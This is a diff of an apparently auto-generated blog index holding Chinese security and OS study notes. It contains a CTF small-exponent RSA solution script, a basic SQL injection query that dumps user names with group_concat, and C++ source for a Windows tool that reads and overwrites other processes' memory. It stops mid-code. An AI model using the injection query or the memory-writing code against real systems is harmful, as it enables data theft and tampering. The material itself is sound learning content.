-<h2 id="break-it-环节"><a class="header-anchor" href="#break-it-环节"></a>break it 环节</h2>
-<p>只做出来一道题</p>
-<h3 id="baby"><a class="header-anchor" href="#baby"></a>baby</h3>
-<p>一道RSA的密码学题目</p>
-<p>给了我们密文c和因数n，e很小。所以可以通过爆破的方式跑出明文</p>
-<p>解密脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">n &#x3D; 691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271</span><br><span class="line">c &#x3D; 3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while 1:</span><br><span class="line">    if(gmpy.root(c+i*n, 3)[1]&#x3D;&#x3D;1):</span><br><span class="line">        print gmpy.root(c+i*n, 3)</span><br><span class="line">        break</span><br><span class="line">    i &#x3D; i+1</span><br></pre></td></tr></table></figure>
-<p>结果是</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br></pre></td></tr></table></figure>
-<p>再解码得到flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br><span class="line">print(libnum.n2s(n))</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200920135022901.png" alt="image-20200920135022901"></p>
+    <title>sql注入</title>
+    <url>/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1>基础</h1>
+<h2 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h2>
+<ol>
+<li>
+<p>查询表中的所有记录，但页面只返回1条（前几条）怎么办？</p>
+<p>使用字符串连接函数：<code>concat()</code> , <code>concat_ws()</code> , <code>group_concat()</code> 等将多条记录的某个字段合并成一个字符串</p>
+<p>eg:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">name</span>) <span class="keyword">from</span> security.user;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/image-20200810162953419.png" alt="image-20200810162953419"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>CTF</category>
+        <category>web</category>
       </categories>
       <tags>
+        <tag>漏洞</tag>
         <tag>CTF</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指令集和操作系统位数</title>
+    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
+    <content><![CDATA[<h1>指令集</h1>
+<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
+<h2 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h2>
+<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
+<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
+<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
+<h1>操作系统位数</h1>
+<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
+<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
       </tags>
   </entry>
   <entry>
     <title>操作系统实验——内存扫描器设计实现</title>
     <url>/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="一、实验内容"><a class="header-anchor" href="#一、实验内容"></a>一、实验内容</h2>
+    <content><![CDATA[<h1>一、实验内容</h1>
 <p>(1) 能直接从当前操作系统（或Windows操作系统或Linux操作系统）内存获取内存存储数据；</p>
 <p>(2) 能对获取的数据进行分析，包括内存结构、进程链表、页目录表结构、进程相关信息等；</p>
 <p>(3) 设计物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</p>
 <p>(4) 设计物理内存数据修改功能，并展示内存数据修改后的结果；</p>
 <p>(5) 界面友好</p>
-<h2 id="二、总体设计"><a class="header-anchor" href="#二、总体设计"></a>二、总体设计</h2>
+<h1>二、总体设计</h1>
 <p>在本次实验中，我只实现了读取系统和内存信息，获取进程列表及进程相关信息，内存内容搜索，内存内容修改四个功能。每个功能分别由一个程序模块实现。程序开始运行时，调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再调用<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
 <p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
-<h2 id="三、详细设计与实现"><a class="header-anchor" href="#三、详细设计与实现"></a>三、详细设计与实现</h2>
-<h3 id="（一）数据结构设计"><a class="header-anchor" href="#（一）数据结构设计"></a>（一）数据结构设计</h3>
+<h1>三、详细设计与实现</h1>
+<h2 id="（一）数据结构设计"><a class="header-anchor" href="#（一）数据结构设计"></a>（一）数据结构设计</h2>
 <ol>
 <li>SYSTEM_INFO 系统信息结构体</li>
 </ol>
@@ -604,17 +495,17 @@
 <li>MEMORY_BASIC_INFORMATION32</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _MEMORY_BASIC_INFORMATION32 &#123;</span><br><span class="line">      DWORD BaseAddress;	&#x2F;&#x2F;指向页面区域基地址的指针</span><br><span class="line">      DWORD AllocationBase;&#x2F;&#x2F;指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内。</span><br><span class="line">      DWORD AllocationProtect;&#x2F;&#x2F;最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为 0。</span><br><span class="line">      DWORD RegionSize;&#x2F;&#x2F;从所有页具有相同属性的基地址开始的区域大小</span><br><span class="line">      DWORD State;&#x2F;&#x2F;区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能</span><br><span class="line">      DWORD Protect;&#x2F;&#x2F;区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。</span><br><span class="line">      DWORD Type;区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能</span><br><span class="line">    &#125; MEMORY_BASIC_INFORMATION32;</span><br></pre></td></tr></table></figure>
-<h3 id="（二）getSystemInfo-模块的设计与实现"><a class="header-anchor" href="#（二）getSystemInfo-模块的设计与实现"></a>（二）getSystemInfo 模块的设计与实现</h3>
+<h2 id="（二）getSystemInfo-模块的设计与实现"><a class="header-anchor" href="#（二）getSystemInfo-模块的设计与实现"></a>（二）getSystemInfo 模块的设计与实现</h2>
 <p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
-<h3 id="（三）getProcessInfo-模块的设计与实现"><a class="header-anchor" href="#（三）getProcessInfo-模块的设计与实现"></a>（三）getProcessInfo 模块的设计与实现</h3>
+<h2 id="（三）getProcessInfo-模块的设计与实现"><a class="header-anchor" href="#（三）getProcessInfo-模块的设计与实现"></a>（三）getProcessInfo 模块的设计与实现</h2>
 <p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
-<h3 id="（四）getMemoryBlock-模块的设计与实现"><a class="header-anchor" href="#（四）getMemoryBlock-模块的设计与实现"></a>（四）getMemoryBlock 模块的设计与实现</h3>
+<h2 id="（四）getMemoryBlock-模块的设计与实现"><a class="header-anchor" href="#（四）getMemoryBlock-模块的设计与实现"></a>（四）getMemoryBlock 模块的设计与实现</h2>
 <p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
-<h3 id="（五）SearchProcessMemory-模块的设计与实现"><a class="header-anchor" href="#（五）SearchProcessMemory-模块的设计与实现"></a>（五）SearchProcessMemory 模块的设计与实现</h3>
+<h2 id="（五）SearchProcessMemory-模块的设计与实现"><a class="header-anchor" href="#（五）SearchProcessMemory-模块的设计与实现"></a>（五）SearchProcessMemory 模块的设计与实现</h2>
 <p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
-<h3 id="（六）ModifyProcessMemory-模块的设计与实现"><a class="header-anchor" href="#（六）ModifyProcessMemory-模块的设计与实现"></a>（六）ModifyProcessMemory 模块的设计与实现</h3>
+<h2 id="（六）ModifyProcessMemory-模块的设计与实现"><a class="header-anchor" href="#（六）ModifyProcessMemory-模块的设计与实现"></a>（六）ModifyProcessMemory 模块的设计与实现</h2>
 <p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
-<h2 id="四、运行结果"><a class="header-anchor" href="#四、运行结果"></a>四、运行结果</h2>
+<h1>四、运行结果</h1>
 <p>程序运行界面如图</p>
 <p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
 <p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
@@ -624,7 +515,7 @@
 <p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
 <p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
 <p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
-<h2 id="五、源代码"><a class="header-anchor" href="#五、源代码"></a>五、源代码</h2>
+<h1>五、源代码</h1>
 <p><em>readMemory.cpp</em></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;list&gt;</span><br><span class="line">#include &lt;iomanip&gt;</span><br><span class="line">#include &lt;tlhelp32.h&gt;</span><br><span class="line">#include &lt;psapi.h&gt;</span><br><span class="line"></span><br><span class="line">#define MAX_ADDR_NUM 1024</span><br><span class="line">using namespace std;</span><br><span class="line">#pragma comment(lib,&quot;psapi.lib&quot;)</span><br><span class="line">DWORD dwProcessId[1024], cbNeededProcess;</span><br><span class="line"></span><br><span class="line">list&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;</span><br><span class="line">SYSTEM_INFO systemInfo;</span><br><span class="line">MEMORYSTATUS memstatus;</span><br><span class="line">list&lt;DWORD&gt; AddrList;</span><br><span class="line"></span><br><span class="line">void getSystemInfo();</span><br><span class="line">void getProcessInfo();</span><br><span class="line">bool getMemoryBlock(DWORD dwProcessId);</span><br><span class="line">bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue);</span><br><span class="line">bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue);</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	cout&lt;&lt;&quot;--------系统及内存信息如下-------&quot;&lt;&lt;endl;</span><br><span class="line">	getSystemInfo();</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;获取当前进程信息</span><br><span class="line">	cout&lt;&lt;endl&lt;&lt;&quot;-----------进程列表如下----------&quot;&lt;&lt;endl;</span><br><span class="line">	getProcessInfo();</span><br><span class="line"></span><br><span class="line">	DWORD pid;</span><br><span class="line">	while(TRUE)&#123;</span><br><span class="line">		pid&#x3D;0;</span><br><span class="line">		cout&lt;&lt;&quot;输入你需要访问的进程PID号: &quot;;</span><br><span class="line">		cin&gt;&gt;pid;</span><br><span class="line">		if(!getMemoryBlock(pid))&#123;</span><br><span class="line">			cout&lt;&lt;&quot;PID &#x3D; &quot;&lt;&lt;(DWORD)pid&lt;&lt;&quot; 的进程打开失败!&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			char c;</span><br><span class="line">			int mode &#x3D; 0;</span><br><span class="line">			while(TRUE)&#123;</span><br><span class="line">				cout&lt;&lt;endl&lt;&lt;&quot;q: 返回&quot;&lt;&lt;endl&lt;&lt;&quot;s: 内存查询&quot;&lt;&lt;endl&lt;&lt;&quot;m: 内存修改&quot;&lt;&lt;endl;</span><br><span class="line">				cout&lt;&lt;&quot;输入功能对应的字母:&quot;;</span><br><span class="line">				cin&gt;&gt;c;</span><br><span class="line">				if(c&#x3D;&#x3D;&#39;q&#39;)&#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				else if(c&#x3D;&#x3D;&#39;s&#39;)&#123;</span><br><span class="line">					DWORD x;</span><br><span class="line">					cout&lt;&lt;&quot;输入查询的值：&quot;;</span><br><span class="line">					cin&gt;&gt;x;</span><br><span class="line">					if(!SearchProcessMemory(pid,x))&#123;</span><br><span class="line">						cout&lt;&lt;&quot;查询失败!&quot;&lt;&lt;endl;</span><br><span class="line">					&#125;else&#123;</span><br><span class="line">						if(AddrList.size()&#x3D;&#x3D;0)&#123;</span><br><span class="line">							cout&lt;&lt;&quot;未查到值为 &quot;&lt;&lt;(DWORD)x&lt;&lt;&quot; 的内存区域!&quot;&lt;&lt;endl;</span><br><span class="line">						&#125;else&#123;</span><br><span class="line">							cout&lt;&lt;&quot;共查到 &quot;&lt;&lt;AddrList.size()&lt;&lt;&quot;个地址&quot;&lt;&lt;endl;</span><br><span class="line">							list&lt;DWORD&gt;::iterator it;</span><br><span class="line">							int i&#x3D;0;</span><br><span class="line">							for(it&#x3D;AddrList.begin();it!&#x3D;AddrList.end();it++)&#123;</span><br><span class="line">								printf(&quot;%d   0x%x \n&quot;,++i,(*it));</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				else if(c&#x3D;&#x3D;&#39;m&#39;)&#123;</span><br><span class="line">					DWORD addr;</span><br><span class="line">					DWORD x;</span><br><span class="line">					cout&lt;&lt;&quot;要写入的内存地址(16进制)：&quot;&lt;&lt;endl;</span><br><span class="line">					cin&gt;&gt;hex&gt;&gt;addr;</span><br><span class="line">					&#x2F;&#x2F; getchar();</span><br><span class="line">					cout&lt;&lt;&quot;要写入的值(10进制)：&quot;&lt;&lt;endl;</span><br><span class="line">					cin&gt;&gt;x;</span><br><span class="line">					if(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x))&#123;</span><br><span class="line">						cout&lt;&lt;&quot;修改成功!&quot;&lt;&lt;endl;</span><br><span class="line">					&#125;else&#123;</span><br><span class="line">						cout&lt;&lt;&quot;修改失败!&quot;&lt;&lt;endl;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		getProcessInfo();</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void getSystemInfo()&#123;</span><br><span class="line"></span><br><span class="line">	GetSystemInfo(&amp;systemInfo);</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区上界:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区起始:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;页面大小:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.dwPageSize&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	GlobalMemoryStatus(&amp;memstatus);</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;物理内存使用率:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;总物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;总页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;总虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void getProcessInfo()&#123;</span><br><span class="line">	&#x2F;&#x2F;为进程列表拍摄快照</span><br><span class="line">    HANDLE hProcessSnap&#x3D;CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);</span><br><span class="line">    if(hProcessSnap&#x3D;&#x3D;INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        printf(&quot;CreateToolhelp32Snapshot调用失败!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize &#x3D; sizeof(PROCESSENTRY32);</span><br><span class="line">    &#x2F;&#x2F;遍历进程快照。轮流显示每个进程的信息</span><br><span class="line">    BOOL bMore&#x3D;Process32First(hProcessSnap,&amp;pe32);</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    printf(&quot;PID\t线程数\t进程名称\n&quot;);</span><br><span class="line">    while(bMore)&#123;</span><br><span class="line"></span><br><span class="line">        bMore&#x3D;Process32Next(hProcessSnap,&amp;pe32);</span><br><span class="line">        _tprintf(_T(&quot;%u\t&quot;),pe32.th32ProcessID);</span><br><span class="line">        _tprintf(_T(&quot;%u\t&quot;),pe32.cntThreads);</span><br><span class="line">        _tprintf(_T(&quot;%s\n&quot;),pe32.szExeFile);</span><br><span class="line"></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;清除snapshot对象</span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    printf(&quot;进程总数:%d\n&quot;,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool getMemoryBlock(DWORD dwProcessId)&#123;</span><br><span class="line">	MemList.clear();</span><br><span class="line">	HANDLE hProcess &#x3D;INVALID_HANDLE_VALUE;</span><br><span class="line">	if(dwProcessId !&#x3D; GetCurrentProcessId())&#123;</span><br><span class="line">		hProcess &#x3D; OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ , FALSE , dwProcessId);</span><br><span class="line">	&#125;</span><br><span class="line">	if(hProcess &#x3D;&#x3D; NULL)&#123;</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	MEMORY_BASIC_INFORMATION  MemBaseInfo;</span><br><span class="line">	DWORD  dwInfoSize &#x3D; sizeof(MEMORY_BASIC_INFORMATION);</span><br><span class="line">	DWORD  dwCurPos &#x3D; (DWORD)systemInfo.lpMinimumApplicationAddress;</span><br><span class="line">	while(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress )&#123;</span><br><span class="line">		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);</span><br><span class="line">		MemList.push_back(MemBaseInfo);</span><br><span class="line">		dwCurPos &#x3D; (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;</span><br><span class="line">	&#125;</span><br><span class="line">	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it &#x3D; MemList.begin();</span><br><span class="line">	int num&#x3D;0;</span><br><span class="line">	dwCurPos &#x3D; (DWORD)(*it).BaseAddress;</span><br><span class="line">	for( ;it !&#x3D; MemList.end(); it++)&#123;</span><br><span class="line">		cout&lt;&lt;dec&lt;&lt;&quot;---- &quot;&lt;&lt;++num&lt;&lt;&quot; ----&quot;&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;内存块基址: 0x&quot;&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;保护方式：&quot;&lt;&lt;(*it).AllocationProtect&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;区域大小：&quot;&lt;&lt;(*it).RegionSize&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;状态：&quot;;</span><br><span class="line">		if((*it).State &#x3D;&#x3D; MEM_COMMIT)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;提交&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).State &#x3D;&#x3D; MEM_FREE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;空闲&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).State &#x3D;&#x3D; MEM_RESERVE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;保留&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else&#123;&#125;</span><br><span class="line">		cout&lt;&lt;&quot;访问保护方式：&quot;;</span><br><span class="line">		if((*it).Protect &#x3D;&#x3D; PAGE_READONLY)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;只读&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_READWRITE )&#123;</span><br><span class="line">			cout&lt;&lt;&quot;读&#x2F;写&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_EXECUTE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;可执行&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_EXECUTE_READ)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;可执行&#x2F;读&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_EXECUTE_READWRITE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;可执行&#x2F;读写&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_NOACCESS)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;不允许存储&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout&lt;&lt;&quot;类型：&quot;;</span><br><span class="line">		if((*it).Type &#x3D;&#x3D; MEM_IMAGE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;映像&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Type &#x3D;&#x3D; MEM_MAPPED)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;映射&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Type &#x3D;&#x3D; MEM_PRIVATE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;私有&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else&#123;&#125;</span><br><span class="line">		dwCurPos+&#x3D;(*it).RegionSize ;</span><br><span class="line">	&#125;</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue)&#123;</span><br><span class="line">	AddrList.clear();</span><br><span class="line">	if(MemList.empty())&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hProcess &#x3D; INVALID_HANDLE_VALUE;</span><br><span class="line">	if(dwProcessId !&#x3D;GetCurrentProcessId())&#123;</span><br><span class="line">		hProcess &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,dwProcessId);</span><br><span class="line">		if(hProcess 